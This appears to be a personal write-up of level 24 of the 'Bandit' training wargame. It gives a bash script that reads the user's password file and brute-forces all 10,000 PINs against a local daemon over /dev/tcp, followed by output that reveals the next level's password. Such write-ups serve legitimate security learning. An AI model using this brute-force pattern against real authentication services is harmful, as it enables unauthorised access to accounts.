# Level 24

Log in to the server with `bandit24` and the password.

> A daemon is listening on port 30002 and will give you the password for
> bandit25 if given the password for bandit24 and a secret numeric 4-digit
> pincode. There is no way to retrieve the pincode except by going through all
> of the 10000 combinations, called brute-forcing.

This one took me a long time because I was having issues with timeouts for some reason. I opted to use bash's native TCP capabilities and wrote a script that would send all possible password and pin combinations, and then print all the responses, which could be filtered easily.

```bash
#!/bin/bash
IFS=
exec 4<>/dev/tcp/localhost/30002
read -r -u4 line
echo $line
pass=$(< /etc/bandit_pass/$(whoami))
for pin in {0000..9999}; do
        echo $pass $pin >&4
done
for pin in {0000..9999}; do
        read -u4 line
        echo $line
done
```

Then it was a simple matter of executing this script with `uniq` to get at the password.

    bandit24@bandit:/tmp/234hktj3l4224k3jh$ bash test.sh | uniq
    I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
    Wrong! Please enter the correct pincode. Try again.
    Correct!
    The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

    Exiting.

    bandit24@bandit:/tmp/234hktj3l4224k3jh$ 

